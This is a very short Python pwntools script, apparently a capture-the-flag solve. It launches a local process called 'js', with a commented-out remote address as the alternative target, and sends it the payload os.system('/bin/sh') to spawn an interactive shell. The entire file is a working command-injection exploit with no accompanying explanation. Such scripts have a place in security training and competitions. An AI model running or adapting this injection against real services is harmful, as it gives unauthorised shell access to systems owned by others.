from pwn import *
#p = remote('111.200.241.244',37916)
p=process("js")
p.sendline("os.system('/bin/sh')")
p.interactive()
